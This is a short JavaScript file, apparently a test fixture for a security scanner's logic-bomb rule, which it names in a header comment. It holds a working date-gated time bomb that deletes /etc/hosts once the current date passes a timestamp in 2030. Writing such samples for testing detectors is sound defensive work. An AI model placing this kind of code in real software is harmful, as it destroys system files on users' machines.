// malicious-logic-bomb.js — triggers thr-logic-bomb-date-gate-js
const fs = require('fs');

// Time-bomb: after a certain date, delete files
if (Date.now() > 1893456000000) {
  fs.unlinkSync('/etc/hosts');
}
